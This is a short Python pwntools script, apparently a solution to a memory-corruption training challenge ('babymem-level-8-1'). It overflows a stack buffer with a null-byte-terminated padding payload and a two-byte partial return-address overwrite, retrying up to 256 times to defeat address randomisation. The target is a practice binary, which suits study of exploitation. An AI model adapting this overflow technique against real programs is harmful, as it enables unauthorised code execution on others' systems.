from pwn import *


offset = 104
offset_win_auth = p16(0x1f54)
for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-8-1')
    proc.recvuntil(b'size: ')
    size = str(106).encode()
    proc.sendline(size)
    proc.recvuntil(b'!\n')
    payload = b'A' * 63 + b'\x00' + (104-64) * b'B' + offset_win_auth
    proc.sendline(payload)
    r = proc.recv()
    proc.close()
    if b'pwn' in r:
        print(r)
        break
